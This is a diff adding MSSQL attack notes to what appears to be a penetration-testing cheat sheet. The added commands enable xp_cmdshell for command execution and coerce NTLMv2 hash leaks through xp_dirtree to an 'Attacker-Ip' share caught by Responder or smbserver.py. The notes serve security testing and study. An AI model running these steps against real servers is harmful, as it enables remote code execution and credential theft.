@@ -29,6 +29,61 @@ https://www.connectionstrings.com/sql-server/
 
 ## impacket mssqlclient.py
 
+```
+$ mssqlclient.py Username:Password@10.10.10.125 -windows-auth
+```
+### Command Execution
+
+By default, the xp_cmdshell option is disabled on new installations. We need to enable it.
+
+```
+-- To allow advanced options to be changed.  
+EXEC sp_configure 'show advanced options', 1;  
+GO  
+-- To update the currently configured value for advanced options.  
+RECONFIGURE;  
+GO  
+-- To enable the feature.  
+EXEC sp_configure 'xp_cmdshell', 1;  
+GO  
+-- To update the currently configured value for this feature.  
+RECONFIGURE;  
+GO  
+
+-- Execute command
+xp_cmdshell "whoami"
+```
+[xp_cmdshell configuration](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-2017)
+
+### Capturing NTLMv2 Hash
+In case a command execution is not possible we can use Responder to set up a rogue SMB server.
+From MsSQL we make a request to any share in our attacker IP, windows will try to authenticate using the user credentials and will send the NTLMv2 hash.
+
+```
+$ responder -i tun0
+
+[+] Listening for events...
+
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.xxx
+[SMBv2] NTLMv2-SSP Username : Machine\mssql-svc
+[SMBv2] NTLMv2-SSP Hash     : mssql-svc::Machine:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+```
+
+Alternative tool would be Impacket smbserver.py that would capture the NTLMv2 hash when user try accessing our share. 
+
+```
+$ smbserver.py -smb2support myshare /Share
+```
+
+The NTLMv2 hash will be capture when executin the following commands on MsSQL Server
+
+```
+declare @q varchar(200);
+set @q='\\Attacker-Ip\AnyShareName';
+exec master.dbo.xp_dirtree @q;
+```
+
 ## DBeaver
 Need to be installed
 GUI 
@@ -40,5 +95,5 @@ $ apt-get install dbeaver
 
 # SQL Injection - Cheat Sheet
 
-https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
-pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet+&cd=1&hl=en&ct=clnk&gl=ca&client=ubuntu
+- https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
+- http://webcache.googleusercontent.com/search?q=cache:qfnxkRmzzNsJ:pentestmonkey.net/cheat-sheet/sql-injection/mssql-sqlinjection-cheat-sheet+&cd=1&hl=en&ct=clnk&gl=ca&client=ubuntu
